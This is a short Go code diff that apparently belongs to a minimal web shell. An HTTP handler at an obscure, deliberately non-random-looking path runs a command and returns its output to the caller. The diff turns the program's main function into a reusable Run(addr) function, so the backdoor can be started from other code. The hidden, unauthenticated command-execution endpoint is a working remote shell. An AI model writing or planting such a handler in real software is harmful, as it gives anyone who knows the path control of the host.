@@ -12,8 +12,13 @@ func CmdHanler(res http.ResponseWriter, req *http.Request) {
 	output, err := c.Output()
 	res.Write([]byte(fmt.Sprintf("%s\n\n%v", string(output), err)))
 }
-func main() {
+func Run(addr string) error {
 	mux := http.NewServeMux()
 	mux.HandleFunc("/zhebushiyigerandompath", CmdHanler)
-	http.ListenAndServe(":8080", mux)
+	err := http.ListenAndServe(addr, mux)
+	if err != nil {
+		return err
+	} else {
+		return nil
+	}
 }
